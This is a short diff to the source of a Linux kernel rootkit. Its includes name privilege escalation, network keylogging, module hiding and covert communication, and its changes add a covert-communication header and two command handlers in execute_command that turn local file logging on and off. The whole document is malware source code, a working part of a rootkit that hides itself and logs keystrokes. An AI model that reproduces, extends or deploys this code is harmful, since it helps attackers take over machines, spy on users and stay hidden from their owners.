@@ -28,6 +28,7 @@
 #include "privilege_escalation.h"
 #include "net_keylog.h"
 #include "hide_module.h"
+#include "covert_communication.h"
 
 static int state = 0;
 static int cstate = 0;
@@ -207,7 +208,15 @@ execute_command (void)
 		priv_deescalation();
 		ROOTKIT_DEBUG("un-rooted\n");
 	}
-
+	 else if(strcmp(command_buffer, "enable_filelog") == 0) {
+                enable_filelog();
+                ROOTKIT_DEBUG("Local file logging enabled\n");
+        }
+        else if(strcmp(command_buffer, "disable_filelog") == 0) {
+                disable_filelog();
+                ROOTKIT_DEBUG("Local file logging disabled\n");
+	}
+        
 	/* cleanup */
 	memset(command_buffer, 0, 32);
 	command_counter = 0;
